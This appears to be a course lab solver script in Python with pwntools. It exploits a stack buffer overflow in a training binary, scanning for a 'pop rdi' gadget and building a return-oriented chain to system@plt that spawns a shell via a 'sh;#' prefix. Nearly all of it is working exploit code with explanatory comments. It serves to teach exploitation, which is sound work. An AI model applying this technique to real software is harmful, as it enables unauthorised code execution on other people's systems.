#!/usr/bin/env python3
#
# Lab 3 – Exercise 2: Final Solver
#
# Vulnerability (from ex2.c, simplified idea):
#   - There is a global buffer `souldream[]`.
#   - `dream()` reads our input into `souldream` via scanf("%255s", souldream).
#   - Later, `nightmare()` has a local buffer `bad_nightmare[64]` and does:
#        memcpy(bad_nightmare, souldream, 0x100);
#     → this copies 0x100 bytes from a global buffer we control into a 64-byte
#       stack buffer, overflowing saved RBP and the saved return address.
#
# Goal:
#   - Place a *command string* at the beginning of `souldream`, e.g. "sh;#".
#   - Overflow `bad_nightmare` so that the saved RET points to:
#       pop rdi; pop rbp; ret; system@plt
#   - Use the gadget `pop rdi; pop rbp; ret` to put `&souldream` into RDI.
#   - When the function returns, it will effectively execute:
#       system(souldream);
#     and because souldream starts with "sh;#", we get an interactive shell:
#       system("sh;#AAAA....ROP....")
#     → "sh" runs the shell; ";" terminates it; "#" makes the rest a comment.
#
# Key points:
#   - We do NOT need to know libc addresses; we call system() via its PLT stub.
#   - We assume the binary is non-PIE, so code addresses (gadgets, PLT) are fixed.
#   - scanf("%255s") stops on whitespace, so the payload must NOT contain spaces,
#     tabs, newlines, etc. NUL bytes are okay.
#

import sys
import time
from pwn import *

# === Configuration ===

exe = './bin/ex2'
# Load the binary as an ELF so pwntools can find symbols, segments, etc.
elf = context.binary = ELF(exe, checksec=False)

# Show info logs (gadget found, addresses, etc.)
context.log_level = 'info'


def check_aslr():
    """
    Check if ASLR is enabled.

    For this exploit:
      - We are calling system() via system@plt in the non-PIE binary.
      - That PLT stub lives at a fixed address regardless of ASLR.
      - souldream is in the binary's data section at a fixed address too.

    So ASLR *can* be enabled and the exploit still works.
    We just warn if it's disabled (lab usually wants it ON for this exercise).
    """
    try:
        with open('/proc/sys/kernel/randomize_va_space', 'r') as f:
            val = f.read().strip()
            if val == '0':
                log.warning("ASLR is DISABLED! Run: sudo sysctl -w kernel.randomize_va_space=2")
            else:
                log.info("ASLR is enabled (Good).")
    except:
        # If we cannot read the file (non-Linux, restricted), we just skip.
        pass


def find_gadget_bytes(seq: bytes, name: str):
    """
    Search for a raw byte sequence `seq` inside all executable segments
    of the binary, and return its virtual address.

    Args:
        seq  – byte sequence to search for (e.g. b'\\x5f\\x5d\\xc3')
        name – human-readable name for logging

    Returns:
        The virtual address of the first occurrence of `seq`,
        or None if not found.
    """
    log.info(f"Scanning for {name} ({seq.hex()})...")

    # Iterate over ELF segments; only look at executable ones (PF_X set).
    for segment in elf.segments:
        if segment.header.p_flags & 1:  # PF_X bit = executable
            data = segment.data()               # raw bytes of the segment
            base = segment.header.p_vaddr       # virtual address where it is mapped
            idx = data.find(seq)                # offset inside the segment
            if idx != -1:
                addr = base + idx               # virtual address of the gadget
                log.success(f"Found {name} at {hex(addr)}")
                return addr

    # Not found
    return None


def main():
    print("=== Lab 3 Ex 2: Final Solver ===")
    check_aslr()

    # === 1. Important addresses from the binary ===
    #
    # souldream:
    #   - global buffer where dream() stores the string read by scanf("%255s").
    #   - We pass our entire payload through this buffer.
    #
    # system@plt:
    #   - PLT entry for system(), used by the binary.
    #   - PLT address is fixed even with ASLR, dynamic linker patches GOT.
    addr_souldream = elf.symbols['souldream']
    addr_system = elf.plt['system']

    log.info(f"souldream @ {hex(addr_souldream)}")
    log.info(f"system@plt @ {hex(addr_system)}")

    # === 2. Find a gadget that can put souldream's address into RDI ===
    #
    # We need something equivalent to "pop rdi; ret". In this binary we have
    # a "dirty gadget":
    #
    #   pop rdi; pop rbp; ret
    #
    # Machine code:
    #   5f 5d c3
    #
    # That means this gadget:
    #   - pops the first 8 bytes into RDI,
    #   - pops the next 8 bytes into RBP,
    #   - then returns.
    #
    # This is fine: we will supply:
    #   [ gadget_addr ][ &souldream ][ dummy_rbp ][ system@plt ] ...
    #
    # If that gadget didn't exist, we would fallback to a clean "pop rdi; ret".
    gadget_addr = find_gadget_bytes(b'\x5f\x5d\xc3', "pop rdi; pop rbp; ret")
    gadget_type = "dirty"

    if not gadget_addr:
        # Fallback: try to find a clean "pop rdi; ret" gadget (5f c3).
        gadget_addr = find_gadget_bytes(b'\x5f\xc3', "pop rdi; ret")
        gadget_type = "clean"

    if not gadget_addr:
        log.error("Critical gadget 'pop rdi' not found! Binary layout is unexpected.")
        return

    # === 3. Offset calculation ===
    #
    # Stack layout in nightmare():
    #   [ ...          ]
    #   [ bad_nightmare (64 bytes) ]
    #   [ saved RBP (8 bytes)      ]
    #   [ saved RIP (8 bytes)      ]
    #
    # memcpy(bad_nightmare, souldream, 0x100) copies 256 bytes into 64-byte
    # buffer, so we can overwrite saved RBP and saved RIP.
    #
    # To reach saved RIP:
    #   64 (bad_nightmare) + 8 (saved RBP) = 72 bytes
    #
    # So we set offset = 72, meaning:
    #   - first 72 bytes of payload: bad_nightmare + saved RBP
    #   - next 8 bytes: new saved RIP (start of our ROP chain)
    offset = 72
    log.info(f"Using Offset: {offset}")

    # === 4. Build the payload ===
    #
    # Payload structure in souldream:
    #
    #   [ "sh;#" ][ 'A' * pad ][ ROP chain... ]
    #
    #   - "sh;#" is the string that system() will execute:
    #        "sh"  → run shell
    #        ";"   → command separator
    #        "#"   → comment out everything after it
    #
    #   - When RET jumps into our ROP chain, we set RDI = &souldream, so
    #     system(souldream) is effectively system("sh;#AAAA...").
    #     The garbage after '#' is ignored by the shell.
    #
    # IMPORTANT: scanf("%255s") stops on whitespace, so our entire payload
    #            must contain NO spaces, tabs, newlines, etc.
    #
    # Command prefix: "sh;#"
    cmd_str = b"sh;#"

    # Compute how many bytes are left until we reach `offset`.
    # After cmd_str + padding, we want to land exactly at saved RIP.
    pad_len = offset - len(cmd_str)
    if pad_len < 0:
        log.error("Command too long for offset!")
        return

    padding = b'A' * pad_len  # 'A' = 0x41, safe non-whitespace byte

    # === ROP chain ===
    #
    # For the dirty gadget "pop rdi; pop rbp; ret", the stack will look like:
    #
    #   [ gadget_addr         ]  -> pushed into RIP when function returns
    #   [ addr_souldream      ]  -> popped into RDI
    #   [ 0xdeadbeef...       ]  -> popped into RBP (ignored)
    #   [ addr_system         ]  -> next RIP after gadget returns
    #
    # So execution flow:
    #   - RET → gadget_addr
    #   - gadget: pop rdi; pop rbp; ret
    #       RDI = addr_souldream
    #       RBP = dummy
    #       RET → addr_system
    #   - system@plt(addr_souldream) → system("sh;#AAAA...")
    #
    chain = b''

    # Put the gadget as the new saved RIP
    chain += p64(gadget_addr)

    # First value popped by gadget → RDI = &souldream
    chain += p64(addr_souldream)

    # If gadget is dirty (pop rdi; pop rbp; ret), we must provide a dummy RBP.
    if gadget_type == "dirty":
        chain += p64(0xdeadbeef)  # arbitrary value for RBP

    # If gadget is clean (pop rdi; ret), stack alignment for system() might be
    # off by 8 bytes. In that case, we may need to insert a plain 'ret' before
    # calling system(), to realign the stack to 16 bytes.
    if gadget_type == "clean":
        # Try to find a simple 'ret' gadget (opcode: c3) and prepend it.
        ret_addr = find_gadget_bytes(b'\xc3', "ret")
        if ret_addr:
            chain = p64(ret_addr) + chain
        else:
            log.warning("Could not find 'ret' gadget for alignment. Exploit might crash.")

    # Finally, call system@plt. At this point RDI = &souldream, so:
    #   system(souldream) == system("sh;#AAAA....")
    chain += p64(addr_system)

    # Combine the final payload: [command][padding][chain]
    payload = cmd_str + padding + chain

    # === 5. Check for bad characters for scanf("%s") ===
    #
    # scanf("%s") stops reading at the first whitespace:
    #   space (0x20), tab, newline, etc.
    #
    # If any part of payload has these bytes, the string gets truncated and
    # memcpy() will not copy the full ROP chain onto the stack.
    if any(b in b' \t\n\r\v\f' for b in payload):
        log.error("Payload contains bad characters (whitespace)! scanf will truncate it.")
        # Debug: print the index and value of the first problematic byte
        for i, b in enumerate(payload):
            if b in b' \t\n\r\v\f':
                print(f"Bad byte {hex(b)} at index {i}")
        return

    # === 6. Launch the attack ===
    print(f"[*] Sending payload ({len(payload)} bytes)...")
    p = process(exe)

    # The program prints something like:
    #   "What is your dream?"
    # We sync up to that prompt to be clean.
    p.recvuntil(b'dream?\n')

    # Send the payload as the "dream" string; scanf("%255s", souldream) reads it.
    p.sendline(payload)

    # Optionally flush any remaining output so the shell prompt is clear.
    try:
        p.clean(timeout=0.2)
    except:
        pass

    log.success("Payload sent. Checking for shell...")

    # === 7. Interact with the spawned shell ===
    #
    # If the exploit worked, nightmare() returned into our gadget,
    # and we now have system("sh;#....") running a shell.
    p.sendline(b'id; ls')
    p.interactive()


if __name__ == "__main__":
    main()

